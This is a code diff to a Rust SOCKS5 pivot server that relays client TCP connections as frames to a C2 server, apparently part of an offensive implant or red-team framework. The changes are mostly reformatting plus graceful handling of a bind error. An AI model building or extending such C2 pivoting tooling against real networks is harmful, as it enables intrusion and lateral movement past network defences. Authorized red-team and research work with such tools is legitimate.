@@ -1,11 +1,11 @@
+use crate::networking::socks5_pivot::{PivotFrame, Socks5PivotHandler};
+use log::{error, info};
+use std::net::Ipv4Addr;
+use std::sync::atomic::{AtomicU32, Ordering};
+use std::sync::Arc;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpListener, TcpStream};
 use tokio::sync::mpsc;
-use crate::networking::socks5_pivot::{PivotFrame, Socks5PivotHandler};
-use std::sync::Arc;
-use log::{info, error};
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use std::sync::atomic::{AtomicU32, Ordering};
-use std::net::Ipv4Addr;
 use tokio::sync::Mutex;
 
 pub struct Socks5PivotServer {
@@ -17,12 +17,22 @@ pub struct Socks5PivotServer {
 // Socks5PivotServer implements a SOCKS5 proxy server that relays connections to a C2 server.
 impl Socks5PivotServer {
     pub fn new(listen_addr: String, listen_port: u16, pivot_tx: mpsc::Sender<PivotFrame>) -> Self {
-        Self { listen_addr, listen_port, pivot_tx }
+        Self {
+            listen_addr,
+            listen_port,
+            pivot_tx,
+        }
     }
 
     pub async fn run(self, pivot_handler: Arc<tokio::sync::Mutex<Socks5PivotHandler>>) {
         let addr = format!("{}:{}", self.listen_addr, self.listen_port);
-        let listener = TcpListener::bind(&addr).await.expect("Failed to bind SOCKS5 pivot server");
+        let listener = match TcpListener::bind(&addr).await {
+            Ok(listener) => listener,
+            Err(e) => {
+                error!("[SOCKS5-PIVOT] Failed to bind {}: {}", addr, e);
+                return;
+            }
+        };
         info!("[SOCKS5-PIVOT] Listening on {}", addr);
 
         loop {
@@ -70,7 +80,8 @@ async fn handle_socks5_client(
         return Err("Only SOCKS5 CONNECT supported".into());
     }
     let addr = match header[3] {
-        0x01 => { // IPv4
+        0x01 => {
+            // IPv4
             let mut ip = [0u8; 4];
             stream.read_exact(&mut ip).await?;
             let mut port = [0u8; 2];
@@ -79,7 +90,8 @@ async fn handle_socks5_client(
             let port = u16::from_be_bytes(port);
             format!("{}:{}", ip, port)
         }
-        0x03 => { // Domain
+        0x03 => {
+            // Domain
             let mut len = [0u8; 1];
             stream.read_exact(&mut len).await?;
             let mut domain = vec![0u8; len[0] as usize];
@@ -95,12 +107,18 @@ async fn handle_socks5_client(
 
     // 3. Assign unique stream ID
     let stream_id = STREAM_ID_COUNTER.fetch_add(1, Ordering::Relaxed);
-    info!("[SOCKS5-PIVOT] CONNECT to {} (stream_id={})", addr, stream_id);
+    info!(
+        "[SOCKS5-PIVOT] CONNECT to {} (stream_id={})",
+        addr, stream_id
+    );
 
     // 4. Send PivotFrame::Open to C2
     let open_frame = PivotFrame::open(stream_id, addr.clone());
     pivot_tx.send(open_frame).await?;
-    info!("[SOCKS5-PIVOT] Sent PivotFrame::Open for stream_id {}", stream_id);
+    info!(
+        "[SOCKS5-PIVOT] Sent PivotFrame::Open for stream_id {}",
+        stream_id
+    );
 
     // 5. Reply to client: success
     // Version, success, reserved, address type, bind addr/port (dummy)
@@ -108,7 +126,8 @@ async fn handle_socks5_client(
     stream.write_all(&reply).await?;
 
     // 6. Register stream with handler for multiplexing
-    let (mut reader, writer) = stream.into_split();{
+    let (mut reader, writer) = stream.into_split();
+    {
         let mut handler = pivot_handler.lock().await;
         handler.register_stream(stream_id, Arc::new(Mutex::new(writer)));
     }
@@ -120,25 +139,42 @@ async fn handle_socks5_client(
         loop {
             match reader.read(&mut buf).await {
                 Ok(0) => {
-                    log::info!("[SOCKS5-PIVOT] Client closed connection (stream_id={})", stream_id);
+                    log::info!(
+                        "[SOCKS5-PIVOT] Client closed connection (stream_id={})",
+                        stream_id
+                    );
                     break;
                 }
                 Ok(n) => {
-                    log::debug!("[SOCKS5-PIVOT] Read {} bytes from SOCKS5 client (stream_id={})", n, stream_id);
+                    log::debug!(
+                        "[SOCKS5-PIVOT] Read {} bytes from SOCKS5 client (stream_id={})",
+                        n,
+                        stream_id
+                    );
                     let frame = PivotFrame::data(stream_id, buf[..n].to_vec());
                     if c2_sender.send(frame).await.is_err() {
-                        log::warn!("[SOCKS5-PIVOT] Failed to send data frame to C2 (stream_id={})", stream_id);
+                        log::warn!(
+                            "[SOCKS5-PIVOT] Failed to send data frame to C2 (stream_id={})",
+                            stream_id
+                        );
                         break;
                     }
                 }
                 Err(e) => {
-                    log::error!("[SOCKS5-PIVOT] Error reading from client (stream_id={}): {:?}", stream_id, e);
+                    log::error!(
+                        "[SOCKS5-PIVOT] Error reading from client (stream_id={}): {:?}",
+                        stream_id,
+                        e
+                    );
                     break;
                 }
             }
         }
         let _ = c2_sender.send(PivotFrame::close(stream_id)).await;
-        log::info!("[SOCKS5-PIVOT] Sent close frame to C2 (stream_id={})", stream_id);
+        log::info!(
+            "[SOCKS5-PIVOT] Sent close frame to C2 (stream_id={})",
+            stream_id
+        );
     });
     info!("[SOCKS5-PIVOT] Started relay for stream_id {}", stream_id);
 
